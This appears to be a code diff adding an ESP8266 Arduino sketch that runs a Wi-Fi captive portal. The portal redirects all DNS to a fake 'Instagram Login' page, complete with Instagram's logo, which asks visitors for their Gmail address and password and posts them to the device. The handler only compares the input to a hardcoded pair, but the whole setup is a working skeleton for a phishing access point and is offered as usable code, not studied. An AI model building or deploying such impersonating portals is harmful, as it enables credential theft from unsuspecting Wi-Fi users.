@@ -1,0 +1,203 @@
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DNSServer.h>
+
+// Replace with your network credentials
+const char *ssid = "ESP8266_Captive";
+const char *password = "123456789";
+
+// Create instances for the server and DNS
+ESP8266WebServer server(80);
+DNSServer dnsServer;
+
+// Instagram-like login page HTML & CSS (with Gmail fields for user credentials)
+const char* loginPage = R"rawliteral(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 0 10px;
+            flex-direction: column;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            width: 100%;
+        }
+        .login-container {
+            background-color: white;
+            border-radius: 5px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #dbdbdb;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #007bb5;
+        }
+        .or {
+            font-size: 12px;
+            color: #999;
+            margin: 20px 0;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #999;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Media queries for responsiveness */
+        @media (max-width: 768px) {
+            body {
+                padding: 20px;
+            }
+            .login-container {
+                padding: 30px;
+                width: 100%;
+            }
+            .logo {
+                width: 120px;
+                margin-bottom: 15px;
+            }
+            input[type="text"],
+            input[type="password"] {
+                font-size: 16px;
+                padding: 12px;
+            }
+            button {
+                font-size: 18px;
+                padding: 15px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 25px;
+                width: 100%;
+            }
+            .logo {
+                width: 100px;
+                margin-bottom: 10px;
+            }
+            input[type="text"],
+            input[type="password"] {
+                font-size: 18px;
+                padding: 12px;
+            }
+            button {
+                font-size: 20px;
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram logo">
+            <form action="/login" method="POST">
+                <input type="text" name="gmail" placeholder="Enter your Gmail" required>
+                <input type="password" name="password" placeholder="Enter your password" required>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+</body>
+</html>
+)rawliteral";
+
+// Setup the Wi-Fi network
+void setup() {
+    Serial.begin(115200);
+    delay(10);
+
+    // Set up the Wi-Fi as an access point
+    WiFi.softAP(ssid, password);
+
+    // Set up DNS server to redirect all traffic to the captive portal
+    dnsServer.start(53, "*", WiFi.softAPIP());
+
+    // Set up the server routes
+    server.on("/", HTTP_GET, []() {
+        server.send(200, "text/html", loginPage);
+    });
+
+    server.on("/login", HTTP_POST, []() {
+        String gmail = server.arg("gmail");
+        String password = server.arg("password");
+
+        // You can add real Gmail login functionality here
+        // For now, it's just a placeholder for demonstration purposes.
+        if (gmail == "user@gmail.com" && password == "password123") {
+            server.send(200, "text/html", "<h2>Welcome, " + gmail + "!</h2><p>You've successfully logged in.</p>");
+        } else {
+            server.send(200, "text/html", "<h2>Invalid Gmail or password. Please try again.</h2>");
+        }
+    });
+
+    // Start the web server
+    server.begin();
+
+    // Print the IP address of the ESP8266 to the serial monitor
+    Serial.println("Captive Portal Started!");
+    Serial.print("IP Address: ");
+    Serial.println(WiFi.softAPIP());
+}
+
+void loop() {
+    dnsServer.processNextRequest();
+    server.handleClient();
+}
